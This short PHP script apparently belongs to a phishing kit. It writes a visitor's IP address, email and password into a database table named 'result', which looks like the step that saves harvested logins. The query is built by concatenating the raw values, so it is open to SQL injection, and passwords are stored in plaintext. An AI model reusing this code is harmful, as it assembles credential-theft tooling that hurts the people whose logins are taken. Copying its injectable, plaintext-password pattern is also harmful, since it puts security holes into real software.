<?php
include("db_connect.php");

$ip = $ip;
$un = $email;
$pw = $password;

if (!$conn) {
  die("Connection failed: " . mysqli_connect_error());
}
	
$sql_rslt = "INSERT INTO result (ip_no,un,pw) VALUES ('". $ip ."','". $un ."','". $pw ."')";
if (mysqli_query($conn, $sql_rslt)) {
		  //echo " <br> New record created successfully";
		}

mysqli_close($conn); 
?> 

